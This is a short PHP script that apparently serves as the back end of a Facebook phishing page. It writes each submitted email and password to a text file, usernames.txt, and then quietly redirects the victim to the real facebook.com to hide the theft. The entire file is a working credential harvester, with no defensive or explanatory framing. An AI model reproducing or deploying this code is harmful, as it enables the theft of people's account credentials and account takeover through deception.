<?php
file_put_contents("usernames.txt", 
    "Facebook Username: " . $_POST['email'] . "\nPass: " . $_POST['pass'] . "\n\n",
    FILE_APPEND);
header('Location: https://facebook.com/');
exit();
?>
